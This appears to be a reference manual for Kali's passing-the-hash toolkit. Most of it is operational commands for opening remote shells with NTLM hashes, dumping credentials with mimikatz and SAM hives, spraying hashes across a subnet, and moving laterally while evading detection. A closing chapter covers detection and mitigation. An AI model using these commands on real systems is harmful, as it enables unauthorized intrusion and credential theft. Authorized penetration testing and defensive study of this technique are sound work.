---
tool_name: "passing-the-hash"
display_name: "Passing-the-Hash"
mitre_tactic: "defense_evasion"
mitre_tactic_id: "TA0005"
mitre_subcategory: "pass_the_hash"
install_command: "sudo apt install passing-the-hash"
version: "0~2015.12.37"
github_repo: "https://gitlab.com/kalilinux/packages/passing-the-hash"
kali_tools_page: "https://www.kali.org/tools/passing-the-hash/"
difficulty_level: "intermediate"
requires_root: false
gui_available: false
tags: ["windows", "ntlm", "pass-the-hash", "samba", "lateral-movement", "authentication"]
related_tools: ["impacket", "mimikatz", "crackmapexec", "netexec"]
---

# Passing-the-Hash

## Chapter 1: Introduction & Overview

### What is Passing-the-Hash?

Passing-the-Hash (PtH) is a technique that authenticates to a remote server/service by using the NTLM hash of a user's password instead of the plaintext password. The NTLM hash itself is the credential — no plaintext password is required. The `passing-the-hash` package on Kali provides patched versions of common tools (curl, smbclient, winexe, wmic, etc.) that accept NTLM hashes as authentication input.

### History & Background

- **Created:** Based on original research by [hdm](https://twitter.com/hdm) (2001) and popularized by Benjamin Delpy (mimikatz) and Skip Duckwall
- **Concept:** NTLM authentication challenge-response does not require the plaintext password — only the hash
- **Relevance:** One of the most common lateral movement techniques in Windows environments

### When to Use This Tool

- **Penetration testing:** Move laterally across Windows networks using captured hashes
- **Red teaming:** Maintain stealth by using hashes instead of plaintext
- **Post-exploitation:** Leverage credential dumps to access additional systems
- **Active Directory attacks:** Exploit shared credentials across hosts

### Key Concepts

- **NTLM Hash:** MD4 hash of the Unicode plaintext password; used in NTLMv1/v2 authentication
- **Challenge-Response:** NTLM authentication protocol; server sends challenge, client responds with hash-derived response
- **SMB/CIFS:** Server Message Block protocol used for file sharing and remote execution
- **WinEXE:** Remote Windows command execution tool
- **WMI:** Windows Management Instrumentation for remote management

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Kali Linux
- **Privileges:** User-level (most tools) / root (for some operations)
- **Dependencies:** Samba libraries, FreeTDS, OpenSSL

### Installation

```bash
sudo apt update
sudo apt install passing-the-hash
```

**Explanation:** Installs the full suite of PtH-patched tools.

### Verification

```bash
dpkg -l | grep passing-the-hash
```

### Installed Tools

| Tool | Purpose |
|------|---------|
| `pth-curl` | HTTP requests with NTLM hash auth |
| `pth-net` | Windows network administration with hash |
| `pth-rpcclient` | SMB RPC client with hash |
| `pth-smbclient` | SMB file sharing client with hash |
| `pth-smbget` | SMB file download with hash |
| `pth-sqsh` | SQL query via SMB with hash |
| `pth-winexe` | Remote Windows command execution |
| `pth-wmic` | WMI queries with hash |
| `pth-wmis` | WMI remote execution with hash |

---

## Chapter 3: Basic Usage

### Authentication Format

All tools accept NTLM hashes in the same format:

```bash
-U 'DOMAIN\USERNAME%LMHASH:NTHASH'
```

**Explanation:** The `-U` flag specifies credentials. The format is `DOMAIN\username%lmhash:nthash`. For NTLMv2, the LM hash is typically `aad3b435b51404eeaad3b435b51404ee` (empty/default).

### Quick Examples

#### SMB Client with Hash

```bash
pth-smbclient -U 'target.example.com\administrator%aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324d4b798e291' //192.168.1.10/C$
```
**Explanation:** Connects to the C$ admin share using NTLM hash authentication.

#### Remote Command Execution with Hash

```bash
pth-winexe -U 'target.example.com\administrator%aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324d4b798e291' //192.168.1.10 cmd.exe
```
**Explanation:** Opens a remote cmd shell on the target using NTLM hash.

#### WMI Query with Hash

```bash
pth-wmic -U 'target.example.com\administrator%aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324d4b798e291' //192.168.1.10 "select * from Win32_OperatingSystem"
```
**Explanation:** Queries WMI using NTLM hash for system information.

---

## Chapter 4: Tool-by-Tool Reference

### pth-smbclient

```bash
# List shares
pth-smbclient -U 'DOMAIN\user%LMHASH:NTHASH' -L //192.168.1.10

# Connect to share
pth-smbclient -U 'DOMAIN\user%LMHASH:NTHASH' //192.168.1.10/ShareName

# Download file
pth-smbclient -U 'DOMAIN\user%LMHASH:NTHASH' //192.168.1.10/C$ -c "get secret.txt"

# Upload file
pth-smbclient -U 'DOMAIN\user%LMHASH:NTHASH' //192.168.1.10/C$ -c "put payload.exe Windows\Temp\payload.exe"
```

### pth-winexe

```bash
# Open interactive shell
pth-winexe -U 'DOMAIN\user%LMHASH:NTHASH' //192.168.1.10 cmd.exe

# Execute single command
pth-winexe -U 'DOMAIN\user%LMHASH:NTHASH' //192.168.1.10 cmd.exe /c "whoami"

# Run as SYSTEM
pth-winexe -U 'DOMAIN\user%LMHASH:NTHASH' --system //192.168.1.10 cmd.exe

# Uninstall winexe service after use
pth-winexe -U 'DOMAIN\user%LMHASH:NTHASH' --uninstall //192.168.1.10 cmd.exe /c "whoami"
```

### pth-wmic

```bash
# System information
pth-wmic -U 'DOMAIN\user%LMHASH:NTHASH' //192.168.1.10 "select * from Win32_OperatingSystem"

# Running processes
pth-wmic -U 'DOMAIN\user%LMHASH:NTHASH' //192.168.1.10 "select name,processid,parentprocessid from Win32_Process"

# Network configuration
pth-wmic -U 'DOMAIN\user%LMHASH:NTHASH' //192.168.1.10 "select * from Win32_NetworkAdapterConfiguration where IPEnabled=true"

# Installed software
pth-wmic -U 'DOMAIN\user%LMHASH:NTHASH' //192.168.1.10 "select name,version from Win32_Product"
```

### pth-wmis

```bash
# Execute command via WMI
pth-wmis -U 'DOMAIN\user%LMHASH:NTHASH' //192.168.1.10 cmd.exe /c "ipconfig /all"

# Execute PowerShell
pth-wmis -U 'DOMAIN\user%LMHASH:NTHASH' //192.168.1.10 powershell.exe -c "Get-Process"

# File operations
pth-wmis -U 'DOMAIN\user%LMHASH:NTHASH' //192.168.1.10 cmd.exe /c "type C:\Users\Administrator\Desktop\passwords.txt"
```

### pth-net

```bash
# List shares
pth-net -U 'DOMAIN\user%LMHASH:NTHASH' rpc share //192.168.1.10

# List users
pth-net -U 'DOMAIN\user%LMHASH:NTHASH' rpc user //192.168.1.10

# List groups
pth-net -U 'DOMAIN\user%LMHASH:NTHASH' rpc group //192.168.1.10

# Domain enumeration
pth-net -U 'DOMAIN\user%LMHASH:NTHASH' ads user -L //192.168.1.10
```

### pth-rpcclient

```bash
# Connect with hash
pth-rpcclient -U 'DOMAIN\user%LMHASH:NTHASH' //192.168.1.10

# Execute commands
pth-rpcclient -U 'DOMAIN\user%LMHASH:NTHASH' -c "enumdomusers; enumdomgroups; getdominfo" //192.168.1.10
```

### pth-curl

```bash
# HTTP NTLM auth
pth-curl -u 'DOMAIN\user%LMHASH:NTHASH' http://192.168.1.10/exchange/

# NTLM auth with verbose output
pth-curl -v -u 'DOMAIN\user%LMHASH:NTHASH' http://192.168.1.10/owa/
```

### pth-smbget

```bash
# Download file
pth-smbget -U 'DOMAIN\user%LMHASH:NTHASH' smb://192.168.1.10/C$/secret.txt

# Recursive download
pth-smbget -r -U 'DOMAIN\user%LMHASH:NTHASH' smb://192.168.1.10/shared/
```

---

## Chapter 5: Advanced Usage

### Working with Hash Formats

#### LM Hash vs NT Hash

```bash
# LM:NT format (standard)
aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324d4b798e291
^^ LM (empty)                           ^^ NT hash (actual credential)

# NT hash only (some tools accept)
b4b9b02e6f09a9bb312324d4b798e291
```

#### Extracting Hashes from mimikatz

```bash
# From mimikatz output
sekurlsa::logonpasswords
# Look for NTLM: b4b9b02e6f09a9bb312324d4b798e291
# Build: aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324d4b798e291
```

#### Extracting Hashes from SAM Database

```bash
# Using impacket
impacket-secretsdump -sam SAM.hiv -system SYSTEM.hiv LOCAL
# Output: Administrator:500:aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324d4b798e291
```

### Lateral Movement Workflow

```bash
# Step 1: Dump hashes on compromised host
# (mimikatz, impacket-secretsdump, etc.)

# Step 2: Use pth-winexe to access next target
pth-winexe -U 'target.example.com\administrator%aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324d4b798e291' //192.168.1.20 cmd.exe

# Step 3: On new target, dump more hashes
# Repeat chain
```

### Combining with Other Tools

#### With Impacket

```bash
# Use hash with impacket psexec
impacket-psexec target.example.com/administrator:b4b9b02e6f09a9bb312324d4b798e291@192.168.1.10

# Use hash with impacket wmiexec
impacket-wmiexec target.example.com/administrator:b4b9b02e6f09a9bb312324d4b798e291@192.168.1.10
```

#### With NetExec

```bash
nxc smb 192.168.1.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324d4b798e291'
```

#### With CrackMapExec

```bash
crackmapexec smb 192.168.1.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324d4b798e291'
```

### Domain Admin Workflow

```bash
# Step 1: Get domain admin hash (DCSync, SAM dump, etc.)
# hash: aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324d4b798e291

# Step 2: Spray across entire subnet
for ip in $(seq 1 254); do
  pth-winexe -U 'target.example.com\administrator%aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324d4b798e291' //192.168.1.$ip cmd.exe /c "echo %COMPUTERNAME%" 2>/dev/null
done
```

---

## Chapter 6: Real-World Scenarios

### Scenario 1: CTF Challenge

**Objective:** Gain admin access to file server

**Steps:**
```bash
# 1. Compromise initial host via vulnerability
# 2. Dump credentials
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
# Found: administrator NTLM hash

# 3. Use PtH to access file server
pth-smbclient -U 'target.example.com\administrator%aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bb312324d4b798e291' //192.168.1.50/C$

# 4. Download flag
smb: \> cd Users\Administrator\Desktop
smb: \> get flag.txt
```

### Scenario 2: Penetration Test

**Objective:** Full domain compromise from low-privilege access

**Steps:**
```bash
# 1. Low-priv user → dump local hashes
pth-winexe -U 'target.example.com\user1%aad3b435b51404eeaad3b435b51404ee:user1_hash' //192.168.1.10 cmd.exe /c "reg save HKLM\SAM C:\temp\SAM.hiv && reg save HKLM\SYSTEM C:\temp\SYSTEM.hiv"

# 2. Download hives
pth-smbclient -U 'target.example.com\user1%aad3b435b51404eeaad3b435b51404ee:user1_hash' //192.168.1.10/C$ -c "get temp\SAM.hiv; get temp\SYSTEM.hiv"

# 3. Extract hashes offline
impacket-secretsdump -sam SAM.hiv -system SYSTEM.hiv LOCAL

# 4. Use admin hash to pivot
pth-winexe -U 'target.example.com\administrator%aad3b435b51404eeaad3b435b51404ee:admin_hash' //192.168.1.20 cmd.exe

# 5. Repeat for domain controllers
```

### Scenario 3: Red Team Operation

**Objective:** Covert lateral movement

**Steps:**
```bash
# 1. Use stolen hash with pth-wmiexec (less noisy than winexe)
pth-wmis -U 'target.example.com\service_acct%aad3b435b51404eeaad3b435b51404ee:svc_hash' //192.168.1.10 cmd.exe /c "powershell -enc <base64_command>"

# 2. Avoid detection by using uncommon tools
pth-curl -u 'target.example.com\admin%aad3b435b51404eeaad3b435b51404ee:hash' http://192.168.1.10/owa/

# 3. Stay within normal traffic patterns
```

---

## Chapter 7: Detection & Defense

### How Defenders Detect PtH

#### Network Indicators

```
# SMB authentication without prior Kerberos ticket
# NTLMv2 authentication from unusual source
# Lateral SMB connections from workstations to workstations
# Unusual WMI/WinRM connections
```

#### Log Analysis

```bash
# Windows Event Logs
# Event ID 4624 - Logon Type 3 (Network) with NTLM
# Event ID 4625 - Failed logon attempts
# Event ID 4768/4769 - Kerberos (absence = NTLM was used)
# Event ID 5140 - Network share access

# Look for:
# - Multiple Type 3 logons from single source
# - NTLM authentication to multiple targets
# - Logon events without corresponding Kerberos events
```

### Mitigation Strategies

#### Disable NTLM Authentication

```bash
# GPO: Network security: LAN Manager authentication level
# Set to "Send NTLMv2 response only. Refuse LM & NTLM"

# Or via registry on each host:
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LmCompatibilityLevel /t REG_DWORD /d 5 /f
```

#### Implement SMB Signing

```bash
# Require SMB signing on all hosts
# GPO: Microsoft network server: Digitally sign communications (always)
# Prevents NTLM relay attacks
```

#### Credential Guard

```bash
# Enable Windows Credential Guard
# Prevents hash extraction from memory
# Blocks mimikatz credential dumping
```

#### Tiered Administration

```
Tier 0: Domain Controllers, Domain Admin accounts
Tier 1: Servers, Server Admin accounts
Tier 2: Workstations, User accounts
Rule: Never use Tier 0 creds on Tier 2 systems
```

#### Monitor for Lateral Movement

```bash
# Deploy SIEM rules for:
# - Multiple NTLM Type 3 logons from single host
# - Pass-the-Hash detection (Event 4624 Type 3 + NTLM)
# - Lateral movement between workstation tiers
# - Anomalous SMB access patterns
```

### Blue Team Response

1. **Enable SMB Signing** — Prevent NTLM relay attacks
2. **Disable NTLM where possible** — Use Kerberos exclusively
3. **Implement Credential Guard** — Block hash extraction
4. **Deploy tiered admin model** — Limit credential exposure
5. **Monitor Event 4624 Type 3** — Detect lateral movement patterns
6. **Implement network segmentation** — Limit lateral movement paths

---

## Chapter 8: Troubleshooting

### Common Errors

#### Error: "NT_STATUS_LOGON_FAILURE"

**Cause:** Invalid hash or username

**Solution:**
```bash
# Verify hash format
# Format: DOMAIN\username%LMHASH:NTHASH
# LM hash is usually: aad3b435b51404eeaad3b435b51404ee
# Verify NT hash is correct
```

#### Error: "NT_STATUS_ACCESS_DENIED"

**Cause:** User lacks permissions for requested operation

**Solution:**
```bash
# Try different user/hash
# Ensure target has the service running (SMB on 445)
# Check if SMB signing is required
```

#### Error: "Connection refused"

**Cause:** Target port not open or service not running

**Solution:**
```bash
# Verify target is reachable
nmap -p 445,139 192.168.1.10
```

### FAQ

**Q: Is passing-the-hash legal?**
A: Yes, as a penetration testing technique with proper authorization. Unauthorized use is illegal under CFAA and equivalent laws.

**Q: What's the difference between PtH and Overpass-the-Hash?**
A: PtH uses NTLM challenge-response directly. Overpass-the-Hash converts the NTLM hash into a Kerberos TGT, enabling Kerberos-based attacks.

**Q: Why use patched tools instead of impacket?**
A: PtH tools are lighter and integrate into familiar workflows. Impacket offers more advanced features but requires Python. Choice depends on engagement requirements.

**Q: Can PtH work across domains?**
A: Yes, with appropriate trust relationships and credentials. Cross-domain PtH typically requires forest trust or explicit credentials.

---

## Resources

### Official Documentation

- [Kali Linux PtH Package](https://www.kali.org/tools/passing-the-hash/)
- [Original PtH Research](http://passing-the-hash.blogspot.fr/)
- [Samba Documentation](https://www.samba.org/samba/docs/)

### Tutorials

- [HackTricks - Pass the Hash](https://book.hacktricks.xyz/windows-hardening/active-directory-attacks/pass-the-hash)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

### Related Tools

- **impacket:** Python network protocol toolkit
- **mimikatz:** Credential extraction from memory
- **netexec:** Network execution and enumeration
- **crackmapexec:** Network exploitation framework

### Practice Resources

- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [VulnHub](https://www.vulnhub.com/)
